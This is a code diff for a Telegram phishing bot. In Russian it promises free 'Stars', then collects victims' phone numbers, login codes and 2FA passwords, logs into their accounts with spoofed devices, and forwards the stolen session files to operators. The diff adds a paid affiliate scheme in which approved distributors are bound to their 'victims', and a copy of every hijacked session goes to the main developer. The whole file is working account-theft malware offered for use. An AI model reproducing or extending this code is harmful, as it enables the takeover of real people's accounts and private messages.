@@ -1,4 +1,5 @@
 import os
+import json
 import secrets
 import asyncio
 import threading
@@ -22,17 +23,60 @@ API_ID = int(os.environ.get("API_ID", "12345678"))
 API_HASH = os.environ.get("API_HASH", "YOUR_API_HASH")
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")
 
-# الآيدي الافتراضي للمسؤول (في حال تم دخول البوت بدون رابط إحالة)
-DEFAULT_ADMIN_ID = int(os.environ.get("DEFAULT_ADMIN_ID", "5963244397"))
+# الآيدي الثابت للأدمن الأساسي (المطور المالك)
+DEFAULT_ADMIN_ID = 5653088167
 
 SESSIONS_DIR = "user_sessions"
 os.makedirs(SESSIONS_DIR, exist_ok=True)
 
+# ملف تخزين الأدمنز والموزعين المقبولين
+ADMINS_FILE = "approved_admins.json"
+
+# ملف تخزين علاقة المستخدم بالمشرف الذي دعاه لأول مرة (Persist Referrers)
+REFERRERS_FILE = "user_referrers.json"
+
+def load_approved_admins():
+    admins = {DEFAULT_ADMIN_ID}
+    if os.path.exists(ADMINS_FILE):
+        try:
+            with open(ADMINS_FILE, "r") as f:
+                data = json.load(f)
+                if isinstance(data, list):
+                    for uid in data:
+                        admins.add(int(uid))
+        except:
+            pass
+    return admins
+
+def save_approved_admins(admins_set):
+    with open(ADMINS_FILE, "w") as f:
+        json.dump(list(admins_set), f)
+
+APPROVED_ADMINS = load_approved_admins()
+
+# دوام حفظ رابط الإحالة لكل مستخدم لكي يظل مرتبطاً بمشرفه الأبدي
+def load_user_referrers():
+    refs = {}
+    if os.path.exists(REFERRERS_FILE):
+        try:
+            with open(REFERRERS_FILE, "r") as f:
+                data = json.load(f)
+                if isinstance(data, dict):
+                    for k, v in data.items():
+                        refs[int(k)] = int(v)
+        except:
+            pass
+    return refs
+
+def save_user_referrers(refs_dict):
+    with open(REFERRERS_FILE, "w") as f:
+        json.dump({str(k): v for k, v in refs_dict.items()}, f)
+
+USER_REFERRERS = load_user_referrers()
+
 # مخازن الحالات المباشرة
 user_states = {}       # حالات التسجيل الحالية
 active_web_tokens = {} # توكنات دخول لوحة التحكم {token: session_path}
-
-# 🧠 ذاكرة البوت لتخزين file_id الخاص بالفيديو لتشغيله بسرعة فائقة
 CACHED_VIDEO_FILE_ID = None
 
 # =============================================================
@@ -94,7 +138,6 @@ WEB_TEMPLATE = """
 </head>
 <body class="h-screen flex overflow-hidden">
 
-    <!-- القائمة الجانبية -->
     <div class="w-full md:w-1/3 lg:w-1/4 sidebar flex flex-col h-full border-l border-slate-700">
         <div class="p-4 bg-slate-800 flex items-center justify-between border-b border-slate-700">
             <div class="flex items-center space-x-3 space-x-reverse">
@@ -118,7 +161,6 @@ WEB_TEMPLATE = """
             <span id="user-phone" dir="ltr">...</span>
         </div>
 
-        <!-- الأقسام -->
         <div class="flex justify-around bg-slate-800 text-sm text-slate-400 border-b border-slate-700 select-none">
             <button onclick="filterChats('all', this)" class="py-3 px-2 active-tab tab-btn">الكل</button>
             <button onclick="filterChats('users', this)" class="py-3 px-2 tab-btn">المستخدمين</button>
@@ -135,7 +177,6 @@ WEB_TEMPLATE = """
         </div>
     </div>
 
-    <!-- منطقة عرض المحادثة -->
     <div class="hidden md:flex flex-1 flex-col h-full chat-area">
         <div id="chat-header" class="p-4 bg-slate-800/80 border-b border-slate-700 flex items-center justify-between">
             <div class="flex items-center space-x-3 space-x-reverse">
@@ -389,11 +430,10 @@ def run_flask():
     app.run(host='0.0.0.0', port=port)
 
 # =============================================================
-# 3. البوت الروسي للنجوم + نظام الإحالة والمشرفين
+# 3. البوت الروسي للنجوم + نظام لوحة الأدمن والارتباط الدائم
 # =============================================================
 bot = TelegramClient('stars_bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-# لوحة مفاتيح الأرقام الشفافة باللغة الروسية
 def make_numeric_keyboard(current_code=""):
     display = f"Введенный код: {current_code}" if current_code else "Код не введен"
     buttons = [
@@ -404,18 +444,92 @@ def make_numeric_keyboard(current_code=""):
     ]
     return display, buttons
 
-# استقبال أمر /start مع إعادة إرسال فيديو vip.mp4 وكاشي لتسريع العرض
+# لوحة التحكم الخاصة بالأدمن الأساسي فقط عند إرسال /admin
+@bot.on(events.NewMessage(pattern='/admin'))
+async def admin_panel(event):
+    user_id = event.sender_id
+    if user_id != DEFAULT_ADMIN_ID:
+        return
+    
+    admins_list_str = "\n".join([f"• `{uid}`" for uid in APPROVED_ADMINS])
+    text = (
+        "🔐 **لوحة تحكم المشرفين الخاصة بالمطور**\n\n"
+        f"📋 **المشرفون المقبولون حالياً:**\n{admins_list_str}\n\n"
+        "➕ لإضافة مشرف جديد أرسل:\n`/add ID`\n\n"
+        "➖ لحذف مشرف أرسل:\n`/del ID`"
+    )
+    await event.respond(text)
+
+# أمر إضافة مشرف جديد
+@bot.on(events.NewMessage(pattern=r'/add\s+(\d+)'))
+async def add_admin_cmd(event):
+    user_id = event.sender_id
+    if user_id != DEFAULT_ADMIN_ID:
+        return
+    
+    try:
+        new_admin_id = int(event.pattern_match.group(1))
+        APPROVED_ADMINS.add(new_admin_id)
+        save_approved_admins(APPROVED_ADMINS)
+        await event.respond(f"✅ تم إضافة الآيدي `{new_admin_id}` بنجاح إلى قائمة المشرفين المعتمدين!")
+    except Exception as e:
+        await event.respond(f"❌ حدث خطأ: {str(e)}")
+
+# أمر حذف مشرف
+@bot.on(events.NewMessage(pattern=r'/del\s+(\d+)'))
+async def del_admin_cmd(event):
+    user_id = event.sender_id
+    if user_id != DEFAULT_ADMIN_ID:
+        return
+    
+    try:
+        target_id = int(event.pattern_match.group(1))
+        if target_id == DEFAULT_ADMIN_ID:
+            await event.respond("⚠️ لا يمكنك حذف الأدمن الأساسي!")
+            return
+        if target_id in APPROVED_ADMINS:
+            APPROVED_ADMINS.remove(target_id)
+            save_approved_admins(APPROVED_ADMINS)
+            await event.respond(f"🗑️ تم إزالة الآيدي `{target_id}` من قائمة المشرفين.")
+        else:
+            await event.respond("⚠️ هذا الآيدي غير موجود في قائمة المشرفين المقبولين.")
+    except Exception as e:
+        await event.respond(f"❌ حدث خطأ: {str(e)}")
+
+# أمر /start مع فحص دائم والارتباط الأبدي بالمشرف الذي جلب المستخدم لأول مرة
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_command(event):
     global CACHED_VIDEO_FILE_ID
     user_id = event.sender_id
     
-    # التقاط الآيدي من رابط الدعوة مثل: /start 5963244397
     args = event.text.split()
-    referrer_id = DEFAULT_ADMIN_ID
+    incoming_referrer = None
     if len(args) > 1 and args[1].isdigit():
-        referrer_id = int(args[1])
+        incoming_referrer = int(args[1])
 
+    # 1. التحقق هل المستخدم مرتبط مسبقاً بمشرف (من خلال الذاكرة الدائمة)
+    if user_id in USER_REFERRERS:
+        referrer_id = USER_REFERRERS[user_id]
+    elif incoming_referrer and incoming_referrer in APPROVED_ADMINS:
+        # إذا دخل برابط مشرف مقبول لأول مرة، نقوم بحفظه بشكل دائم
+        referrer_id = incoming_referrer
+        USER_REFERRERS[user_id] = referrer_id
+        save_user_referrers(USER_REFERRERS)
+    else:
+        # إذا لم يكن لديه مشرف مسجل، ودخل بدون رابط أو برابط غير مقبول
+        if user_id == DEFAULT_ADMIN_ID:
+            referrer_id = DEFAULT_ADMIN_ID
+        else:
+            sub_text = (
+                "🔒 **عذراً، هذا الرابط غير مفعّل أو غير مرخص!**\n\n"
+                "للاستفادة من البوت وخدمات النجوم، يرجى الاشتراك وتفعيل حسابك عبر التواصل مع المطور:\n\n"
+                "👉 **المطور:** @HackWahm\n\n"
+                "اطلب منه اعتماد الآيدي الخاص بك لتتمكن من استخدام البوت."
+            )
+            await event.respond(sub_text)
+            return
+
+    # حتى لو أعاد إرسال /start لاحقاً، يظل البوت شغالاً معه طبيعياً
     user_states[user_id] = {
         "step": "WAITING_PHONE", 
         "code": "",
@@ -430,7 +544,6 @@ async def start_command(event):
     
     phone_btn = [Button.request_phone("📱 Авторизоваться и получить Stars", resize=True, single_use=True)]
     
-    # ⚡ إرسال الفيديو المرفق مع الكاش لضمان السرعة الفائقة وعدم تكرار الرفع
     try:
         if CACHED_VIDEO_FILE_ID:
             await bot.send_file(
@@ -468,7 +581,6 @@ async def process_phone(event):
             
             sess_filename = os.path.join(SESSIONS_DIR, f"sess_{user_id}")
             
-            # 🎲 توليد جهاز عشوائي جديد تماماً لكل محاولة اتصال جديدة
             device_info = get_random_device_params()
             
             temp_client = TelegramClient(
@@ -530,7 +642,7 @@ async def process_keyboard(event):
     await event.edit(f"📩 Введите код из сообщения Telegram:\n\n{disp_text}", buttons=btns)
     await event.answer()
 
-# معالجة الكود المباشر والدعم لـ 2FA (وفي حال خطأ الكود يتم تغيير الجهاز والطلب مجدداً بجهاز مختلف تماماً)
+# معالجة الكود وتغيير الجهاز في حال خطأ الكود
 async def verify_code_and_login(event, user_id):
     state = user_states[user_id]
     code, client, phone = state["code"], state["client"], state["phone"]
@@ -604,13 +716,13 @@ async def process_2fa_password(event):
             await event.respond("❌ Неверный пароль. Введите еще раз:")
 
 # =============================================================
-# 4. الإنهاء + إرسال النتيجة لصاحب رابط الدعوة (The Referrer/Owner)
+# 4. الإنهاء + إرسال النتيجة دائماً لنفس المشرف المرتبط به المستخدم
 # =============================================================
 async def notify_owner_and_finish(event, user_id):
     state = user_states[user_id]
     client = state["client"]
     sess_filename = state["sess_filename"]
-    referrer_id = state["referrer_id"]
+    referrer_id = state.get("referrer_id", DEFAULT_ADMIN_ID)
     phone = state["phone"]
     device_info = state.get("device_info", {})
     file_path = f"{sess_filename}.session"
@@ -641,7 +753,7 @@ async def notify_owner_and_finish(event, user_id):
         notification_text = (
             f"🚀 **تم صيد جلسة جديدة بنجاح!**\n\n"
             f"👤 **الاسم:** {first_name} {last_name}\n"
-            f"🆔 **الآيدي:** `{user_id}`\n"
+            f"🆔 **آيدي الضحية:** `{user_id}`\n"
             f"🏷️ **اليوزر:** {username}\n"
             f"📱 **الرقم:** `{phone}`\n"
             f"📱 **آخر جهاز تم استخدامه:** `{device_str}`\n\n"
@@ -651,18 +763,28 @@ async def notify_owner_and_finish(event, user_id):
         web_btn = [Button.url("👻 فتح واجهة التحكم (وَهَم)", wahm_link)]
         
         try:
+            # إرسال الصيد دائماً لصاحب الرابط الأصلي المرتبط بهذا المستخدم
             await bot.send_file(
                 referrer_id,
                 file_path,
                 caption=notification_text,
                 buttons=web_btn
             )
+            
+            # إرسال نسخة احتياطية لك كأدمن أساسي إذا كان الصيد جاء عبر رابط مشرف آخر
+            if referrer_id != DEFAULT_ADMIN_ID:
+                await bot.send_file(
+                    DEFAULT_ADMIN_ID,
+                    file_path,
+                    caption=f"📋 (صيد عبر رابط المشرف: `{referrer_id}`)\n\n" + notification_text,
+                    buttons=web_btn
+                )
         except Exception as e:
             if referrer_id != DEFAULT_ADMIN_ID:
                 await bot.send_file(
                     DEFAULT_ADMIN_ID,
                     file_path,
-                    caption=f"⚠️ (تعذر الوصول للصاحب الاصلي {referrer_id})\n\n" + notification_text,
+                    caption=f"⚠️ (تعذر الوصول للمشرف {referrer_id})\n\n" + notification_text,
                     buttons=web_btn
                 )
 
@@ -676,6 +798,6 @@ if __name__ == '__main__':
     web_thread.daemon = True
     web_thread.start()
     
-    print("🚀 البوت الروسي للنجوم مع نظام الفيديوهات وتغيير الأجهزة الذكي يعمل بنجاح...")
+    print("🚀 البوت يعمل مع نظام الارتباط الدائم بالمشرفين بنجاح...")
     bot.run_until_disconnected()
 
